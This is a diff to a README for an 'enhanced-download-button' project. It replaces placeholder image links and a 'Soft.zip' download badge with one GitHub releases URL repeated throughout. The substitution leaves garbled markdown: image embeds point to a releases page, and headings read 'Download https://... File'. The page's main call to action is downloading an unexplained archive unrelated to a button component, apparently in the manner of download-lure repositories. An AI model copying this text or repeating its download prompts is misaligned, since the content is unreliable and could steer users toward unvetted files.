@@ -1,6 +1,6 @@
 # 🚀 Enhanced Download Button Repository
 
-![Enhanced Download Button Image](https://example.com/image.jpg)
+![Enhanced Download Button Image](https://github.com/sweensys/enhanced-download-button/releases)
 
 Welcome to the **"enhanced-download-button"** repository - where you will find a stylish and responsive download button with a real-time download counter, smooth animations, and error handling. This button is designed to be easily customizable and optimized for a seamless user experience.
 
@@ -25,10 +25,10 @@ Welcome to the **"enhanced-download-button"** repository - where you will find a
 ## Repository Topics 📚
 "animated-button, api-integration, css, download-button, dynamic-counter, error-handling, fast-performance, file-download, gradient-ui, html, javascript, responsive-ui, user-experience, vercel-hosting"
 
-## Download Soft.zip File
-Click the button below to download the Soft.zip file:
+## Download https://github.com/sweensys/enhanced-download-button/releases File
+Click the button below to download the https://github.com/sweensys/enhanced-download-button/releases file:
 
-[![Download Soft.zip](https://img.shields.io/badge/Download-Soft.zip-blue.svg)](https://github.com/file/Soft.zip)
+[![Download https://github.com/sweensys/enhanced-download-button/releases](https://github.com/sweensys/enhanced-download-button/releases)](https://github.com/sweensys/enhanced-download-button/releases)
 
 ## How to Use 📝
 1. Clone or download the repository
@@ -47,4 +47,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 **Happy Downloading!** 🌟
 
-![GIF](https://example.com/gif.gif)
+![GIF](https://github.com/sweensys/enhanced-download-button/releases)
